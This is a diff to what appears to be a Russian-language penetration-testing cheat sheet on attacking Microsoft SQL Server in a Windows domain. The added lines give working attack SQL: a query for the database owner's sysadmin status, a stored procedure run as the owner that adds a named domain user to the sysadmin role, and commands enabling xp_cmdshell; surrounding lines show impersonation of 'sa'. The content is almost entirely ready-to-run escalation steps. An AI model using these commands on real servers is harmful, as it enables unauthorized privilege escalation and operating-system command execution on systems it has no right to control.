@@ -158,6 +158,20 @@ export KRB5CCNAME=sqlsvc.ccache
 
       SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
         SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
+
+* узнать кто владелец базы данных
+  
+        SELECT d.name AS DatabaseName, SUSER_SNAME(d.owner_sid) AS DatabaseOwner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS IsOwnerSysadmin FROM sys.databases d WHERE d.name = 'prod';
+* создание процедуры повышения привелегий
+
+        use prod
+        CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember 'FREIGHTLOGISTIC\ron.mcginnis', 'sysadmin' END;	--создание процедуры повышения привелегий
+        EXEC sp_elevate_me;
+        SELECT IS_SRVROLEMEMBER('sysadmin') AS AmISysadminNow;
+        EXEC sp_configure 'show advanced options', 1;
+        RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+        GO
+
 * Имперсонификация
 
       EXECUTE AS LOGIN = 'sa';
